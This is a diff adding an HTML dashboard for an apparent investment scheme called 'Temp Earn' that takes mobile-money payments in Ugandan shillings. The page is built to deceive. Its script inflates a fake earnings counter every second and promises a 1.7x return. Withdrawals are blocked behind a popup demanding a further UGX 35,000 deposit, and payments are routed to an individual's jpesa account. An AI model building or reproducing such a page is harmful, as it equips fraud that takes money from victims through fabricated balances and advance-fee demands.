@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="en" class="h-100">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Dashboard - Temp Earn</title>
+  <link rel="icon" href="https://bitrixe.com/favicon.ico" type="image/png" />
+  <link href="https://fonts.googleapis.com/css2?family=Rubik:wght@400;600;700&display=swap" rel="stylesheet" />
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet" />
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet" />
+  <style>
+    body { background-color: #111; color: #fff; font-family: 'Rubik', sans-serif; min-height: 100vh; padding-top: 3rem; }
+    .dashboard-container { max-width: 960px; margin: auto; padding: 2rem; }
+    .card { background-color: #1e1e1e; border-radius: 16px; padding: 1.5rem; margin-bottom: 1.5rem; color: #fff; border: 1px solid #333; }
+    .card h5 { font-weight: 600; color: #FFD700; }
+    .btn-warning { background-color: #FFD700; color: #000; font-weight: bold; border-radius: 12px; }
+    .btn-warning:hover { background-color: #e6c200; }
+    .header { text-align: center; margin-bottom: 2rem; }
+    .logout-btn { position: fixed; top: 20px; right: 20px; background: none; border: none; color: #fff; font-weight: bold; cursor: pointer; z-index: 1000; }
+    .logout-btn:hover { color: #FFD700; }
+    footer { text-align: center; margin-top: 3rem; font-size: 0.9rem; color: #aaa; }
+    .popup {
+      position: fixed;
+      bottom: 20px;
+      right: 20px;
+      background: #FFD700;
+      color: #000;
+      padding: 20px;
+      border-radius: 10px;
+      font-weight: bold;
+      animation: wiggle 0.3s ease-in-out infinite;
+      z-index: 9999;
+    }
+    @keyframes wiggle {
+      0% { transform: rotate(-2deg); }
+      50% { transform: rotate(2deg); }
+      100% { transform: rotate(-2deg); }
+    }
+    @media (max-width: 576px) {
+      .dashboard-container { padding: 1rem; }
+      .logout-btn { position: static; display: block; margin: 0 auto 1rem; }
+    }
+  </style>
+</head>
+<body>
+  <button class="logout-btn" onclick="window.location.href='index (3).html'"><i class="fa fa-sign-out-alt"></i> Logout</button>
+
+  <main class="dashboard-container">
+    <div class="header">
+      <img src="https://png.pngtree.com/template/20190727/ourmid/pngtree-investment-money-logo-with-circle-abstract-image_283618.jpg" width="64" alt="Logo" class="mb-2" />
+      <h2 class="text-warning">Welcome to Your Dashboard</h2>
+      <p>Manage your investments & earnings</p>
+      <button class="btn btn-sm btn-outline-light mt-2" id="toggleEarnings">⏸️ Pause Earnings</button>
+    </div>
+
+    <div class="row">
+      <div class="col-12 mb-3">
+        <label for="planSelect" class="form-label text-warning fw-semibold">Select Your Plan</label>
+        <form id="jpesaForm" method="post" action="https://my.jpesa.com/?dad=xp" target="_blank">
+          <input type="hidden" name="ownerid" value="godfrey.nsereko">
+          <input type="hidden" name="description" value="Credit Note">
+          <input type="hidden" name="return" value="https://my.jpesa.com">
+          <input type="hidden" name="cancel" value="https://my.jpesa.com">
+          <select class="form-select mb-2" name="amount" id="planSelect">
+            <option value="20000">Plan 1 - UGX 20,000</option>
+            <option value="50000">Plan 2 - UGX 50,000</option>
+            <option value="100000">Plan 3 - UGX 100,000</option>
+          </select>
+          <select name="cur" class="form-select mb-2">
+            <option value="UGX">UGX</option>
+            <option value="KES">KES</option>
+            <option value="USD">USD</option>
+          </select>
+          <input type="submit" class="btn btn-warning" value="Make Payment">
+        </form>
+      </div>
+
+      <div class="col-md-6">
+        <div class="card">
+          <h5><i class="fa fa-chart-line"></i> Active Investment</h5>
+          <p>Plan: <strong id="planAmount">UGX 0</strong></p>
+          <p>Expected Return: <strong id="expectedReturn" class="text-success">UGX 0</strong></p>
+          <p>Time Left: <strong id="timeLeft" class="text-info">00:00:00</strong></p>
+        </div>
+      </div>
+
+      <div class="col-md-6">
+        <div class="card">
+          <h5><i class="fa fa-wallet"></i> Total Earnings</h5>
+          <h3 id="totalEarnings" class="text-success">UGX 0</h3>
+          <p class="text-muted">Withdraw to Airtel Money or Crypto</p>
+        </div>
+      </div>
+
+      <div class="col-md-6">
+        <div class="card">
+          <h5><i class="fa fa-calendar-day"></i> Daily Summary</h5>
+          <p>You earned <strong id="dailyEarnings" class="text-success">UGX 0</strong> today</p>
+          <button class="btn btn-warning mt-2" onclick="handleWithdraw()">Withdraw Now</button>
+        </div>
+      </div>
+
+      <div class="col-md-6">
+        <div class="card">
+          <h5><i class="fa fa-clock"></i> Next Payout</h5>
+          <p><strong id="nextPayoutTime">Today at 8:00 PM</strong></p>
+          <p>Status: <span id="payoutStatus" class="badge bg-warning text-dark">Pending</span></p>
+          <p>Time Left: <strong id="nextPayoutCountdown" class="text-info">00:00:00</strong></p>
+        </div>
+      </div>
+
+      <div class="col-md-12">
+        <div class="card text-center">
+          <h5>Want to Earn More?</h5>
+          <a href="games.html" class="btn btn-warning mt-2">Make Another Investment</a>
+        </div>
+      </div>
+    </div>
+  </main>
+
+  <div id="popupMessage" class="popup" style="display:none;">
+    You need to deposit UGX 35,000 to withdraw.<br>
+    <a href="https://my.jpesa.com/?dad=xp" target="_blank" class="btn btn-dark btn-sm mt-2">Click here to pay</a>
+  </div>
+
+  <script>
+    let totalEarnings = 0;
+    let countdownStart = Date.now();
+    let activeDuration = 86400;
+    const totalEarningsEl = document.getElementById('totalEarnings');
+    const dailyEarningsEl = document.getElementById('dailyEarnings');
+    const timeLeftEl = document.getElementById('timeLeft');
+    const popupMessage = document.getElementById('popupMessage');
+    const planSelect = document.getElementById('planSelect');
+    const planAmount = document.getElementById('planAmount');
+    const expectedReturn = document.getElementById('expectedReturn');
+
+    function formatUGX(num) {
+      return 'UGX ' + num.toLocaleString();
+    }
+    function formatTime(seconds) {
+      const h = Math.floor(seconds / 3600);
+      const m = Math.floor((seconds % 3600) / 60);
+      const s = seconds % 60;
+      return [h, m, s].map(v => v.toString().padStart(2, '0')).join(':');
+    }
+    function handleWithdraw() {
+      if (totalEarnings < 500000) {
+        popupMessage.style.display = 'block';
+      } else {
+        alert('Withdrawal successful!');
+      }
+    }
+    function updateLiveEarnings() {
+      totalEarnings += 100;
+      totalEarningsEl.textContent = formatUGX(totalEarnings);
+      dailyEarningsEl.textContent = formatUGX(totalEarnings);
+      const elapsed = Math.floor((Date.now() - countdownStart) / 1000);
+      const remaining = Math.max(activeDuration - elapsed, 0);
+      timeLeftEl.textContent = formatTime(remaining);
+    }
+    planSelect.addEventListener('change', () => {
+      const val = parseInt(planSelect.value);
+      planAmount.textContent = formatUGX(val);
+      expectedReturn.textContent = formatUGX(val * 1.7);
+    });
+    setInterval(updateLiveEarnings, 1000);
+  </script>
+</body>
+</html>
